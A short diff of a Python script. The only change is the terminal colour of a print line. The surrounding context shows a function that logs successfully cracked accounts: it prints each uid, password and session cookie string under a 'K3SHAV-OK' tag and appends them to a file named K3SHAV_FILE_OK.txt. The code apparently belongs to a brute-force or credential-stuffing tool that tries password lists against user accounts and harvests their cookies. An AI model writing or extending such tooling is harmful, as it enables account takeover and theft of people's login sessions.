@@ -241,7 +241,7 @@ def api1(ids,names,passlist):
 					uid = str(po['uid'])
 					coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
 					print('\r\r\033[1;32m |K3SHAV-OK| '+uid+' | '+pas)
-					print('\r\r \033[1;35m|COOKIE|=> : '+coki)
+					print('\r\r \033[1;92m|COOKIE|=> : '+coki)
 					file_path = os.path.join(folder_path, 'K3SHAV_FILE_OK.txt')
 					with open(file_path, 'a') as file:
 						file.write(uid+'|'+pas+'|'+coki+'\n')
